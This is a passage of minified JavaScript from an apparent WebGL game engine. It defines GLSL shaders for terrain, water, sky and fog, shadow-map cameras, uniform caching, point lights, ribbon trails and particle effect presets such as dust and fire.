uN=result.rgb*Cq*oZ*0.65;vec3 Aj=result.rgb*Kp;result.rgb=Aj+uN+vec3(zd)*0.15+Wp*Jo;float Zk=distance(SB.xz,Xa.xz);result.rgb=mix(result.rgb,QV.rgb,QV.a*((Zk<Xa.y ? Zk/Xa.y : 0.0)*0.5+max(0.,(0.09-abs(Xa.y-Zk))/0.1)));snippet cX;Tf=result;}",
            vert: "snippet version;snippet xg;snippet oh;snippet xK;snippet shadowsEnabled;in vec3 position;in vec3 Lx;in vec2 Ek;in vec4 JZ;in vec4 TQ;uniform mat4 Td;uniform mat4 kX;uniform mat4 WH;uniform vec3 Xs;out vec3 KW;out vec3 Cb;out vec3 SB;out vec2 Zj;out vec4 qb;out vec3 WZ;out vec4 TN;out vec4 hA;out vec3 GR;out vec3 Xa;void main(){Xa.xz=Xs.xz-(Td*vec4(0.0,0.0,0.0,1.0)).xz;Xa.y=Xs.y;SB=position;Cb=Lx;TN=JZ;hA=TQ;Zj=Ek*16.0;KK=Td*vec4(position,1.0);snippet GA;snippet YL;GR=-normalize(KK.xyz-KD);if(shadowsEnabled==1){vec4 MF=xK(WH*(KK));WZ=(MF.xyz/MF.w)*0.5+0.5;}gl_Position=kX*KK;}"
        }
        , mc = {
            frag: "snippet version;in vec3 SB;in vec3 Xa;out vec4 Tf;void main(){float Zk=distance(SB.xz,Xa.xz);if(Zk>Xa.y){Tf.rgba=vec4(0.0,0.0,0.0,1.0);}else{Tf.rgba=mix(vec4(0.0,1.0,0.0,1.0),vec4(0.0,0.0,0.0,1.0),Zk/Xa.y);}}",
            vert: "snippet version;in vec3 position;in vec3 Lx;uniform mat4 Td;uniform mat4 Rg;uniform mat4 zR;uniform vec3 Xs;out vec3 SB;out vec3 Xa;void main(){Xa.xz=Xs.xz-(Td*vec4(0.0,0.0,0.0,1.0)).xz;Xa.y=Xs.y;SB=position;gl_Position=zR*Rg*vec4(position+Lx*0.001,1.0);}"
        }
        , pc = {
            frag: "snippet version;snippet xg;snippet shadowsEnabled;uniform float time;uniform mat4 pG;uniform float visibility;uniform float speed;uniform vec3 Tp;uniform vec3 Nt;uniform vec3 Mx;uniform sampler2D zj;uniform sampler2D Ux;uniform sampler2D WY;in vec2 Zj;in vec3 Cb;out vec4 Tf;snippet xK;float getWaterDepth(vec2 Za,float z){return texture(zj,Za).r-z;}void main(){snippet Ft;ivec2 fG=textureSize(zj,0);float hZ=1.0/float(fG.x);vec4 jN=xK(pG*KK);vec3 Gh=(jN.xyz/jN.w)*0.5+0.5;float LX=1.0;if(shadowsEnabled==1){if(Gh.x>0.0&&Gh.x<1.0&&Gh.y>0.0&&Gh.y<1.0){float Yx=Gh.z;float TX=hZ*0.5;float LK=getWaterDepth(Gh.xy+vec2(-TX,-TX),Gh.z);float Ks=getWaterDepth(Gh.xy+vec2(TX,-TX),Gh.z);float YD=getWaterDepth(Gh.xy+vec2(-TX,TX),Gh.z);float hG=getWaterDepth(Gh.xy+vec2(TX,TX),Gh.z);float AJ=mod(Gh.x-TX,hZ)/hZ;float jQ=mod(Gh.y-TX,hZ)/hZ;LX=mix(mix(LK,Ks,AJ),mix(YD,hG,AJ),jQ);}else{LX=1.0;}LX*=50.0;}float speed=speed*0.01;float zm=0.0;vec3 Lx=normalize(Cb);vec2 dir=normalize(Cb.xz);float MQ=1.0;for(int i=0;i<2;++i){float jC=1.0/3.0*float(i);float t=mod(time*0.2+jC,1.0)*3.141;float Kl=speed+0.2;vec2 shift=vec2(Kl*dir.y*t+jC,Kl*dir.x*t+jC);float curve=abs(sin(t));zm+=texture(Ux,Zj.yx*0.5+shift).r*curve;MQ+=((sin((Zj.x+shift.y)*10.0)+cos((Zj.y+shift.x)*10.0))*curve*(0.2+Kl*0.6));}float Jr=visibility/100.0;vec4 PV=texture(WY,Zj.yx+time*speed*2.0+zm*0.1);vec4 Oq=vec4(Tp,0.0);vec4 hJ=vec4(Tp,0.9);vec4 kQ=vec4(mix(Tp,Nt,0.9)*0.8,0.5)+speed*0.1;vec4 nX=vec4(Nt,0.4)+PV*0.05;vec4 Ip=vec4(mix(Nt,Mx,0.5),0.8-Jr*0.4)+PV*0.08;vec4 JC=vec4(Mx,1.4-Jr*0.8)+PV*0.12;float rj=0.03+0.01*zm;float BM=rj+0.02+speed*0.05+0.03*zm+MQ*0.02;float Bh=BM+(0.05+speed*0.5*zm+MQ*0.05)*Jr;float PG=Bh+(0.2+speed*0.2-zm*0.1)*Jr;float ZC=PG+(0.2)*Jr;vec4 result=vec4(0.0);if(LX<rj){result=mix(Oq,hJ,smoothstep(0.0,rj,LX));}else if(LX<BM){result=mix(hJ,kQ,smoothstep(rj,BM,LX));}else if(LX<Bh){result=mix(kQ,nX,smoothstep(BM+(Bh-BM)*0.3,Bh,LX));}else if(LX<PG){result=mix(nX,Ip,smoothstep(Bh+(PG-Bh)*0.4,PG,LX));}else{result=mix(Ip,JC,smoothstep(ZC,1.0,LX));}result.rgb+=(abs(Lx.x)+abs(Lx.z))*0.5-0.2;float oZ=max(dot(Cz,Lx),0.0);float wV=0.0;vec3 HQ=reflect(-Cz,Lx);vec3 Gb=-normalize(KK.xyz-KD);float iD=max(dot(HQ,Gb),0.0);wV=min(1.0,max(0.0,pow(iD,10.0)))*0.6;result.rgb=result.rgb*Cq*oZ+result.rgb*Kp+wV*Cq;snippet cX;Tf=result;}",
            vert: "snippet version;snippet xg;uniform mat4 Td;uniform mat4 kX;uniform float time;uniform int Oy;uniform float pP;uniform float YX;uniform float speed;in vec3 position;in vec3 Lx;in vec2 Ek;out vec3 Cb;out vec2 Zj;out vec3 MW;void main(){vec4 Za=vec4(position,1.0);if(Oy==0){if(Za.x<=-0.5)Za.x-=10.0;if(Za.z<=-0.5)Za.z-=10.0;if(Za.x>=0.5)Za.x+=10.0;if(Za.z>=0.5)Za.z+=10.0;}KK=Td*Za;KK.y+=cos(KK.z*YX*0.005)*sin(KK.x*0.1+KK.z*YX*0.008+time*speed*0.1)*pP*0.03;snippet YL;Zj=KK.xz/2.0;Cb=vec3(0.01,0.8,0.002)*6.5;gl_Position=kX*KK;}"
        };
    var fc = Object.freeze({
        __proto__: null,
        clouds: jl,
        cloudsTex: ql,
        drop: Xl,
        foliage: Hl,
        multimeshFlat: Kl,
        multimeshSimple: Wl,
        multimeshTextured: Yl,
        multimeshTileable: Vl,
        multimeshTree: Gl,
        particles: Ql,
        post: Jl,
        ssao: tc,
        ssaoBlur: ec,
        ribbon: sc,
        shadowInstanced: ic,
        shadowInstancedAlpha: nc,
        shadowTerrain: ac,
        simple: rc,
        simpleShaded: oc,
        simpleTextured: lc,
        sky: cc,
        skyStarTex: hc,
        sun: dc,
        terrain: uc,
        terrainDebug: mc,
        water: pc
    });
    const gc = {
        version: "#version 300 es\n    precision highp float;\n    precision highp int;\n  ",
        xg: "\n    uniform vec3 Kp;\n    uniform vec3 Cz;\n    uniform vec3 Cq;\n    uniform vec3 rJ;\n    uniform vec3 Ck;\n    uniform float Qx;\n    uniform float NR;\n    uniform vec3 KD;\n    out float Wl; // V\n    out vec4 KK; // V\n    in float Wl; // F\n    in vec4 KK; // F\n  ",
        shadowsEnabled: `\n    const int shadowsEnabled = ${ji.shadows ? 1 : 0};\n  `,
        oh: "\n    uniform vec4 DY[16];\n    uniform vec3 GK[16];\n    uniform int fR;\n    out vec3 Wp;\n  ",
        GA: "\n    vec3 Uk = vec3(0.0);\n    for(int i = 0; i < fR; ++i){\n      vec3 Hc = GK[i] - KK.xyz;\n      float Xr = DY[i].w-dot(Hc,Hc);\n      if(Xr > 0.0){\n        Xr /= (DY[i].w);\n        Xr = Xr*Xr;\n        Uk += max(0.0,dot(normalize(Hc), Cb)) * DY[i].rgb*Xr;\n      } \n    }\n    Wp = Uk;\n  ",
        YL: "\n    Wl = length(KD - KK.xyz);\n  ",
        Ft: "\n    float fogValue = Wl;\n    if(fogValue > NR){\n      float fogFade = NR*0.1;\n      float fogPatt = 0.5 - sin(KK.x*2.0)*0.25+sin(KK.y*2.0)*0.25;\n      if(fogValue + fogPatt*fogFade  >= NR+fogFade) discard;\n    } ",
        YM: "\n    float YM = smoothstep(Qx*1.5, NR*0.75, fogValue);\n  ",
        cX: "\n    result.rgb = mix(result.rgb, Ck, smoothstep(Qx, NR, fogValue));",
        xK: "\n    vec4 xK(vec4 Za){\n      Za.x = 2.0 / (1.0+exp(-10.0*Za.x)) - 1.0;\n      Za.y = 2.0 / (1.0+exp(-10.0*Za.y)) - 1.0;\n      return Za;\n    }",
        NM: "\n    vec2 hash( vec2 p ) {\n    p = vec2(dot(p,vec2(127.1,311.7)), dot(p,vec2(269.5,183.3)));\n    return -1.0 + 2.0*fract(sin(p)*43758.5453123);\n  }",
        Ug: "float noise( in vec2 p ) {\n    const float K1 = 0.366025404; // (sqrt(3)-1)/2;\n    const float K2 = 0.211324865; // (3-sqrt(3))/6;\n    vec2 i = floor(p + (p.x+p.y)*K1); \n    vec2 a = p - i + (i.x+i.y)*K2;\n    vec2 o = (a.x>a.y) ? vec2(1.0,0.0) : vec2(0.0,1.0);\n    vec2 b = a - o + K2;\n    vec2 c = a - 1.0 + 2.0*K2;\n    vec3 h = max(0.5-vec3(dot(a,a), dot(b,b), dot(c,c) ), 0.0 );\n    vec3 n =h*h*h*vec3( dot(a,hash(i+0.0)), dot(b,hash(i+o)), dot(c,hash(i+1.0)));\n    float d = dot(n, vec3(70.0));\n    return smoothstep(-1.0,1.0,d);\n  }",
        RZ: Array(8).fill(0).map((t, e) => `uniform vec4 tinf${e};`).join("")
    }
        , vc = (t, e) => t.replace(/snippet (\w+);/g, (t, s) => {
            let i = gc[s].split("\n");
            return i = i.filter(t => !(0 == e && t.indexOf("// F") > -1) && !(1 == e && t.indexOf("// V") > -1)),
                i.join("\n")
        }
        )
        , yc = t => {
            for (const e in t)
                t[e].vert && (t[e].vert = vc(t[e].vert, 0)),
                    t[e].frag && (t[e].frag = vc(t[e].frag, 1))
        }
        ;
    let bc = 0
        , wc = 0;
    const xc = [0, 0, 0];
    let kc = !1;
    const $c = {}
        , Sc = {}
        , Ec = [0, 0, 0]
        , Mc = [256, 512, 1024, 2048, 4096][ji.shadowmapResolution] || 1024
        , _c = {}
        , Cc = () => {
            _c.sK = new sa(Aa),
                _c.water = new sa(Aa),
                Za.addChild(_c.sK),
                Za.addChild(_c.water),
                $c.shadowStatic = new va(Aa, {
                    width: Mc,
                    height: Mc,
                    color: 0,
                    depthTexture: !0,
                    depthCompareMode: Aa.COMPARE_REF_TO_TEXTURE
                }),
                $c.sK = new va(Aa, {
                    width: Mc,
                    height: Mc,
                    color: 0,
                    depthTexture: !0,
                    depthCompareMode: Aa.COMPARE_REF_TO_TEXTURE
                }),
                $c.water = new va(Aa, {
                    width: Mc,
                    height: Mc,
                    color: 0,
                    depthTexture: !0
                });
            for (const t in $c)
                Sc[t] = new Set([$c[t]])
        }
        , Tc = ({ dt: t, viewRange: e, world: s, camera: i }) => {
            const n = i.FS;
            if (bc != n) {
                bc = n,
                    kc = !0;
                for (const t in _c)
                    _c[t].orthographic({
                        near: .1,
                        FS: "sK" == t ? 2 * n : 200,
                        left: -n,
                        right: n,
                        bottom: -n,
                        top: n
                    }),
                        _c[t].updateMatrixWorld(!1)
            }
            (ji.realtimeShadows || kc || s.time - wc > 10 || nn(Ra.position, xc) > 15) && (Yi(_c.sK.position, Ec),
                en(_c.sK.position, _c.sK.position, n),
                _c.sK.lookAt(Na, La),
                Qi(_c.sK.position, _c.sK.position, Ra.position),
                Vi(_c.water.position, 1e-4, 100, 0),
                _c.water.lookAt(Na, La),
                Qi(_c.water.position, _c.water.position, Ra.position),
                _c.water.position[1] = 200,
                Yi(xc, Ra.position),
                kc = !0,
                wc = s.time)
        }
        , Pc = t => {
            kc = t
        }
        , Ic = t => {
            Yi(Ec, t)
        }
        ;
    var Dc = Object.freeze({
        __proto__: null,
        get needUpdate() {
            return kc
        },
        targets: $c,
        targetSets: Sc,
        size: Mc,
        cameras: _c,
        init: Cc,
        tick: Tc,
        setNeedUpdate: Pc,
        setDirectional: Ic
    });
    let Ac = {};
    const Bc = () => {
        Ac = {
            resolution: {
                c: Fc,
                value: [0, 0]
            },
            time: {
                c: Rc,
                value: 0
            },
            QP: {
                c: Rc,
                value: 0
            },
            Kp: {
                c: Zc,
                value: [0, 0, 0]
            },
            rJ: {
                c: Zc,
                value: [0, 0, 0]
            },
            Cz: {
                c: Zc,
                value: [0, 0, 0]
            },
            Cq: {
                c: Zc,
                value: [0, 0, 0]
            },
            Qx: {
                c: Rc,
                value: 0
            },
            NR: {
                c: Rc,
                value: 0
            },
            Ck: {
                c: Zc,
                value: [0, 0, 0]
            },
            KD: {
                c: Zc,
                value: Ba.worldPosition
            },
            WH: {
                c: Lc,
                value: _c.sK.kX
            },
            sK: {
                c: zc,
                value: $c.sK.depthTexture
            },
            pG: {
                c: Lc,
                value: _c.water.kX
            },
            zj: {
                c: zc,
                value: $c.water.depthTexture
            },
            Ux: {
                c: zc
            },
            WY: {
                c: zc
            },
            DY: {
                c: null,
                value: [0, 0, 0, 0]
            },
            GK: {
                c: null,
                value: [0, 0, 0]
            },
            fR: {
                c: Rc,
                value: 0
            },
            HC: {
                c: zc
            },
            jx: {
                c: zc
            },
            Tb: {
                c: zc,
                value: Fo.terrain
            },
            zR: {
                c: Lc,
                value: Ba.zR
            },
            kX: {
                c: Lc,
                value: Ba.kX
            },
            Oh: {
                c: zc
            },
            LG: {
                c: zc
            },
            Xs: {
                c: Zc,
                value: [0, 0, 0]
            },
            QV: {
                c: Uc,
                value: [0, 1, 0, 1]
            },
            movieMode: {
                c: Rc,
                value: 0
            }
        };
        for (let t = 0; t < 8; ++t)
            Ac["tinf" + t] = {
                c: null,
                value: [0, 0, 0, 0]
            };
        for (const t in Ac)
            Ac[t].state = 1
    }
        , Rc = (t, e) => {
            t.value !== t.cacheValue && (t.state++,
                t.cacheValue = t.value)
        }
        , zc = (t, e) => {
            if (!t.value)
                return;
            (t.value.length ? t.value : [t.value]).forEach(s => {
                s.id !== e.state.textureUnits[s.textureUnit] && t.state++
            }
            )
        }
        , Fc = (t, e) => {
            t.cacheArray && Ca(t.value, t.cacheArray) || (t.state++,
                t.cacheArray ? ya(t.cacheArray, t.value) : t.cacheArray = t.value.slice())
        }
        , Zc = (t, e) => {
            t.cacheArray && un(t.value, t.cacheArray) || (t.state++,
                t.cacheArray ? Yi(t.cacheArray, t.value) : t.cacheArray = t.value.slice())
        }
        , Uc = (t, e) => {
            t.cacheArray && Kn(t.value, t.cacheArray) || (t.state++,
                t.cacheArray ? qn(t.cacheArray, t.value) : t.cacheArray = t.value.slice())
        }
        , Lc = (t, e) => {
            t.cacheArray && Ln(t.value, t.cacheArray) || (t.state++,
                t.cacheArray ? _n(t.cacheArray, t.value) : t.cacheArray = t.value.slice())
        }
        , Nc = ({ dt: t, world: e, renderer: s }) => {
            Ac.time.value = e.smoothtime % 600;
            for (const t in Ac) {
                const e = Ac[t];
                null !== e.c && e.c(e, s)
            }
        }
        , Oc = (t, e) => {
            ba(Ac.resolution.value, t, e),
                Ac.resolution.state++
        }
        , jc = {}
        , qc = ({ dt: t, world: e, renderer: s }) => {
            Nc({
                dt: t,
                world: e,
                renderer: s
            })
        }
        , Xc = () => {
            if (Bc(),
                yc(fc),
                ji.ssao) {
                za.addPass({
                    fragment: tc.frag,
                    globalUniforms: Ac
                });
                for (let t = 0; t < 2; ++t)
                    za.addPass({
                        fragment: ec.frag,
                        uniforms: {
                            step: {
                                value: t
                            }
                        },
                        globalUniforms: Ac,
                        postDraw: 0 == t ? void 0 : () => {
                            Aa.bindFramebuffer(Aa.READ_FRAMEBUFFER, za.ping.buffer),
                                Aa.bindFramebuffer(Aa.DRAW_FRAMEBUFFER, za.original.buffer),
                                Aa.blitFramebuffer(0, 0, za.pong.width, za.pong.height, 0, 0, za.pong.width, za.pong.height, Aa.COLOR_BUFFER_BIT, Aa.NEAREST)
                        }
                    })
            }
            za.addPass({
                fragment: Jl.frag,
                globalUniforms: Ac
            }),
                jc.foliage = new xn(Aa, {
                    vertex: Hl.vert,
                    fragment: Hl.frag,
                    cullFace: null,
                    active: !1,
                    globalUniforms: Ac
                }),
                jc.multimeshFlat = new xn(Aa, {
                    vertex: Kl.vert,
                    fragment: Kl.frag,
                    instanced: {
                        color: {
                            size: 4
                        }
                    },
                    globalUniforms: Ac
                }),
                jc.multimeshTextured = new xn(Aa, {
                    vertex: Yl.vert,
                    fragment: Yl.frag,
                    globalUniforms: Ac
                }),
                jc.multimeshTree = new xn(Aa, {
                    vertex: Yl.vert,
                    fragment: Gl.frag,
                    globalUniforms: Ac
                }),
                jc.multimeshTileable = new xn(Aa, {
                    vertex: Vl.vert,
                    fragment: Yl.frag,
                    instanced: {
                        gY: {
                            size: 1
                        }
                    },
                    globalUniforms: Ac
                }),
                jc.multimeshSimple = new xn(Aa, {
                    vertex: Wl.vert,
                    fragment: Wl.frag,
                    instanced: {
                        color: {
                            size: 4
                        }
                    },
                    globalUniforms: Ac
                }),
                jc.drop = new xn(Aa, {
                    vertex: Xl.vert,
                    fragment: Xl.frag,
                    instanced: {
                        oK: {
                            size: 4
                        },
                        Tz: {
                            size: 4
                        }
                    },
                    globalUniforms: Ac
                }),
                jc.terrain = new xn(Aa, {
                    vertex: uc.vert,
                    fragment: uc.frag,
                    globalUniforms: Ac,
                    autoUniforms: ["Dz"]
                }),
                jc.sun = new xn(Aa, {
                    vertex: rc.vert,
                    fragment: dc.frag,
                    transparent: !0,
                    globalUniforms: Ac
                }),
                jc.clouds = new xn(Aa, {
                    vertex: rc.vert,
                    fragment: jl.frag,
                    transparent: !0,
                    frontFace: Aa.CW,
                    globalUniforms: Ac
                }),
                jc.water = new xn(Aa, {
                    vertex: pc.vert,
                    fragment: pc.frag,
                    transparent: !0,
                    active: !1,
                    globalUniforms: Ac
                }),
                jc.sky = new xn(Aa, {
                    vertex: cc.vert,
                    fragment: cc.frag,
                    cullFace: null,
                    depthTest: !0,
                    globalUniforms: Ac
                }),
                jc.shadowInstancedAlpha = new xn(Aa, {
                    cullFace: null,
                    vertex: ic.vert,
                    fragment: nc.frag,
                    autoUniforms: ["Dz"],
                    globalUniforms: Ac
                }),
                jc.shadowInstanced = new xn(Aa, {
                    vertex: ic.vert,
                    fragment: ic.frag,
                    globalUniforms: Ac
                }),
                jc.shadowTerrain = new xn(Aa, {
                    vertex: ac.vert,
                    fragment: ac.frag,
                    globalUniforms: Ac,
                    uniforms: {
                        Gv: {
                            value: 1
                        }
                    }
                }),
                jc.particles = new xn(Aa, {
                    vertex: Ql.vert,
                    fragment: Ql.frag,
                    active: !1,
                    transparent: !0,
                    depthWrite: !1,
                    globalUniforms: Ac
                }),
                jc.ribbon = new xn(Aa, {
                    vertex: sc.vert,
                    fragment: sc.frag,
                    transparent: !0,
                    cullFace: null,
                    depthWrite: !1,
                    globalUniforms: Ac
                })
        }
        , Hc = t => {
            Ac.kX.state++,
                jc.shadowTerrain.frontFace = t.CW,
                jc.shadowTerrain.uniforms.Gv.value = 0
        }
        , Kc = t => {
            Ac.kX.state++,
                jc.shadowTerrain.frontFace = t.CCW,
                jc.shadowTerrain.uniforms.Gv.value = 1
        }
        , Wc = t => {
            Ac.WH.state++,
                Ac.kX.state++
        }
        , Yc = t => {
            Ac.pG.state++
        }
        ;
    var Vc = Object.freeze({
        __proto__: null,
        shaders: jc,
        tick: qc,
        init: Xc,
        onBeforeShadow: Hc,
        onBeforeWater: Kc,
        onAfterShadow: Wc,
        onAfterWater: Yc
    });
    let Gc;
    const Qc = () => {
        Gc = new na(Aa, {
            program: jc.sky
        }),
            Gi(Gc.scale, 40),
            Gc.setParent(Za),
            Gc.visible = !1,
            Gc.renderOrder = 6e3,
            Gc.frustumCulled = !1,
            Do("engine/skybox.ho", t => {
                const e = new bn(Aa, t);
                Gc.geometry = e;
                const s = jo(hc.frag, 1024, Fa);
                jc.sky.uniforms.Oh.value = s,
                    jc.sky.uniforms.Oh.state++,
                    Gc.visible = !0
            }
            )
    }
        , Jc = ({ camera: t, cameraPivot: e }) => {
            e.updateMatrixWorld(!1),
                Gc.position[0] = .998 * t.KP[12],
                Gc.position[1] = .998 * t.KP[13],
                Gc.position[2] = .998 * t.KP[14]
        }
        ;
    var th = Object.freeze({
        __proto__: null,
        get mesh() {
            return Gc
        },
        init: Qc,
        tick: Jc
    });
    let eh, sh;
    const ih = () => {
        ji.clouds && Do("engine/skybox.ho", t => {
            sh = new bn(Aa, t),
                eh = new na(Aa, {
                    geometry: sh,
                    program: jc.clouds
                }),
                eh.position[1] = 0,
                eh.offset = 0,
                Gi(eh.scale, .2),
                eh.scale[1] *= .3,
                eh.renderOrder = 4e3,
                eh.frustumCulled = !1,
                eh.matrixAutoUpdate = !1,
                eh.updateMatrix(),
                eh.setParent(Gc);
            const e = jo(ql.frag, 1024, Fa);
            jc.clouds.uniforms.LG.value = e,
                jc.clouds.uniforms.LG.state++
        }
        )
    }
        ;
    var nh = Object.freeze({
        __proto__: null,
        get mesh() {
            return eh
        },
        get geometry() {
            return sh
        },
        init: ih
    });
    const ah = [];
    let rh, oh, lh;
    const ch = () => {
        oh = Ac.DY,
            rh = Ac.GK,
            lh = Ac.fR
    }
        , hh = ({ dt: t }) => {
            ah.sort((t, e) => t.camDistance - e.camDistance);
            for (let t = 0, e = ah.length; t < e; ++t) {
                const s = ah[t];
                if (s.remove)
                    ah.splice(t, 1),
                        --t,
                        --e;
                else if (t < 16) {
                    const e = 4 * t
                        , i = 3 * t;
                    rh.value[i] = s.KP[12],
                        rh.value[i + 1] = s.KP[13],
                        rh.value[i + 2] = s.KP[14],
                        oh.value[e] = s.val[0],
                        oh.value[e + 1] = s.val[1],
                        oh.value[e + 2] = s.val[2],
                        oh.value[e + 3] = s.val[3] * (1 - s.distanceFactor)
                }
            }
            rh.state++,
                oh.state++,
                lh.value = Math.min(16, ah.length)
        }
        , dh = ({ QY: t, size: e }, s, i) => (s || ((s = new Jn).remove = !1,
            ah.push(s)),
            s.KP = i,
            s.val = [...t, e],
            s)
        , uh = ({ chunk: t, gl: e, scene: s }) => {
            for (let t = 0; t < ah.length; ++t)
                ah[t].remove = !0
        }
        , mh = ({ world: t }) => {
            ah.length = 0
        }
        ;
    var ph = Object.freeze({
        __proto__: null,
        Jo: ah,
        init: ch,
        tick: hh,
        createLight: dh,
        destroy: uh,
        onWorldDestroy: mh
    });
    class fh {
        constructor(t = 0, e = 0) {
            this.start = t,
                this.end = t + e,
                this.duration = e
        }
        done(t) {
            return t > this.end
        }
        fraction(t) {
            return nr(1 - (this.end - t) / (this.end - this.start), 0, 1)
        }
        remaining(t) {
            return this.end - t
        }
        passed(t) {
            return t - this.start
        }
        reset(t, e = this.duration) {
            return this.start = t,
                this.end = t + e,
                this.duration = e,
                !0
        }
        set(t, e) {
            return this.start = t,
                this.end = e,
                this.duration = this.end - this.start,
                !0
        }
    }
    const gh = []
        , vh = 66
        , yh = new Uint32Array(vh);
    for (let t = 0, e = 0; t < vh; t += 6,
        e += 2)
        yh[t + 0] = e,
            yh[t + 1] = e + 1,
            yh[t + 2] = e + 3,
            yh[t + 3] = e,
            yh[t + 4] = e + 3,
            yh[t + 5] = e + 2;
    const bh = new Map
        , wh = t => {
            const e = bh.get(t.steps || 10);
            let s;
            return s = e && 0 !== e.length ? e.pop() : new Sh(t),
                s.reset(t),
                gh.push(s),
                s
        }
        , xh = ({ dt: t }) => {
            for (let e = 0; e < gh.length; e++)
                if (gh[e].tick(t),
                    gh[e].remove) {
                    const t = gh.splice(e--, 1)[0];
                    bh.has(t.maxSteps) || bh.set(t.maxSteps, []),
                        bh.get(t.maxSteps).push(t),
                        t.onCache()
                }
        }
        , kh = ({ world: t }) => {
            gh.forEach($h),
                bh.forEach(t => {
                    t.forEach($h)
                }
                ),
                bh.clear(),
                gh.length = 0
        }
        , $h = t => {
            t.mesh.setParent(null)
        }
        ;
    class Sh {
        constructor(t) {
            this.maxSteps = t.steps || 10,
                this.stepTimer = new fh(0, 1),
                this.timer = new fh(0, 1),
                this.lines = this.maxSteps + 1,
                this.Ek = new Float32Array(4 * this.lines),
                this.positions = new Float32Array(6 * this.lines),
                this.geometry = new bn(Aa, {
                    position: {
                        size: 3,
                        data: this.positions
                    },
                    Ek: {
                        size: 2,
                        data: this.Ek
                    },
                    index: {
                        type: Aa.UNSIGNED_INT,
                        data: yh.subarray(0, 6 * this.maxSteps)
                    }
                }),
                this.mesh = new na(Aa, {
                    frustumCulled: !1,
                    geometry: this.geometry,
                    matrixAutoUpdate: !1,
                    program: jc.ribbon
                }),
                this.mesh.offset = [0, this.maxSteps, 1]
        }
        reset(t) {
            if (this.stepTimer.reset(0, t.interval || .5),
                this.timer.reset(Ua.time, t.timer || 1),
                this.currentStep = 0,
                this.permanent = t.permanent || !1,
                this.a = t.a,
                this.b = t.b,
                this.mesh.offset[2] = t.repeat || .5,
                this.remove = !1,
                this.timeoutSteps = 0,
                t.uvTop = t.uvTop || 1,
                t.uvBot = t.uvBot || 0,
                this.uvTop !== t.uvTop || this.uvBot !== t.uvBot) {
                for (let e = 0, s = 0; e < this.lines; ++e,
                    s += 4)
                    this.Ek[s] = e / this.maxSteps,
                        this.Ek[s + 2] = e / this.maxSteps,
                        this.Ek[s + 1] = t.uvTop,
                        this.Ek[s + 3] = t.uvBot;
                this.uvTop = t.uvTop,
                    this.uvBot = t.uvBot,
                    this.geometry.updateAttribute(this.geometry.attributes.Ek)
            }
            this.geometry.drawRange.count = 0,
                this.mesh.Xj = this.Xj = t.Xj,
                this.mesh.Zw = this.Zw = t.Zw,
                this.mesh.setParent(Za),
                this.parent = t.parent || Za
        }
        tick(t) {
            if (this.timer.done(Ua.time) && !this.permanent)
                return void (this.remove = !0);
            if (null !== this.parent) {
                if (this.mesh.visible = this.parent.visible && (!this.parent.parent || this.parent.parent.visible),
                    !this.mesh.visible || this.parent.worldMatrixNeedsUpdate)
                    return;
                this.mesh.visible && 0 == this.timeoutSteps && (this.positions.set(hn(Oa, this.a, this.parent.KP), 0),
                    this.positions.set(hn(Oa, this.b, this.parent.KP), 3))
            }
            this.stepTimer.done(Ua.time) && (this.stepTimer.reset(Ua.time),
                this.step()),
                this.geometry.updateAttribute(this.geometry.attributes.position);
            const e = this.stepTimer.fraction(Ua.time);
            this.mesh.offset[0] = e / (this.maxSteps + 1) + (this.permanent ? 0 : this.timer.fraction(Ua.time)),
                this.currentStep < this.maxSteps ? this.mesh.offset[1] = this.maxSteps / (this.currentStep + e) : this.mesh.offset[1] = 1
        }
        step() {
            this.currentStep = Math.min(this.maxSteps, this.currentStep + 1),
                this.positions.copyWithin(6, 0),
                this.geometry.drawRange.count = 6 * this.currentStep,
                this.timeoutSteps > 0 && (this.timeoutSteps--,
                    0 == this.timeoutSteps && (this.remove = !0))
        }
        destroy() {
            this.parent = null,
                this.mesh.setParent(null),
                this.mesh.geometry.remove(),
                this.mesh = void 0,
                this.geometry = void 0
        }
        onCache() {
            this.mesh.setParent(null),
                this.mesh.visible = !1
        }
    }
    var Eh = Object.freeze({
        __proto__: null,
        add: wh,
        tick: xh,
        onWorldDestroy: kh
    });
    const Mh = {}
        , _h = (t, e) => {
            const s = [];
            for (let i = 0; i < t; ++i) {
                const t = e(i);
                t.idStart = t.idStart || 0,
                    t.Zw = t.Zw || t.Xj,
                    t.scaleStart = t.scaleStart || 1,
                    t.rotaStart = t.rotaStart || 0,
                    t.idEnd = void 0 !== t.idEnd ? t.idEnd : t.idStart,
                    t.scaleEnd = void 0 !== t.scaleEnd ? t.scaleEnd : t.scaleStart,
                    t.rotaEnd = void 0 !== t.rotaEnd ? t.rotaEnd : t.rotaStart,
                    t.friction = t.friction || 0,
                    t.acc = t.acc || [0, 0, 0],
                    t.VT = t.VT || lr.linear,
                    s.push(t)
            }
            return s
        }
        ;
    Mh.dust = _h(3, () => ({
        idStart: 2,
        rotaStart: 3 * Math.random(),
        rotaEnd: 3 * -Math.random(),
        Xj: [Yo(.4, .5), Yo(.4, .5), Yo(.4, .5), 2],
        Zw: [Yo(.4, .5), Yo(.4, .5), Yo(.4, .5), 2],
        scaleStart: .7 + .5 * Math.random(),
        scaleEnd: 0,
        friction: .1,
        duration: 350
    })),
        Mh.floaterGreen = _h(5, () => ({
            VT: lr.sinReverse,
            idStart: 6,
            Xj: [Yo(.5, .8), Yo(1.5, 2), Yo(.5, .8), 2.5],
            Zw: [Yo(0, .2), Yo(.8, .9), Yo(.1, .2), 0],
            scaleStart: 1,
            scaleEnd: .5,
            duration: 15e3
        })),
        Mh.totemfloater = _h(1, () => ({
            VT: lr.sinReverse,
            idStart: 6,
            Xj: [Yo(.5, .8), Yo(1.5, 2), Yo(.5, .8), 2.5],
            Zw: [Yo(0, .2), Yo(.8, .9), Yo(.1, .2), 0],
            scaleStart: 2,
            scaleEnd: 2,
            duration: 2e3
        })),
        Mh.floaterRed = _h(5, () => ({
            VT: lr.sinReverse,
            idStart: 0,
            Xj: [Yo(1.5, 2), Yo(.5, .7), Yo(.3, .6), 2.5],
            Zw: [Yo(0, .2), Yo(.2, .5), Yo(.2, .2), 0],
            scaleStart: .15,
            scaleEnd: .04,
            duration: 15e3
        })),
        Mh.fire = _h(12, () => {
            const t = Yo(0, .5);
            return {
                VT: lr.sinReverse,
                idStart: 0,
                idEnd: 0,
                Xj: [1, .2 + 2 * t, t, 1],
                Zw: [.4, .1, 0, 0],
                scaleStart: 1 - t,
                scaleEnd: .3 - t,
                rotaStart: Yo(-2, 2),
                rotaEnd: Yo(-2, 2),
                acc: [0, Yo(1, 3), 0],
                duration: Yo(1e3, 1e3)
            }
        }
        ),
        Mh.torchfire = _h(5, () => {
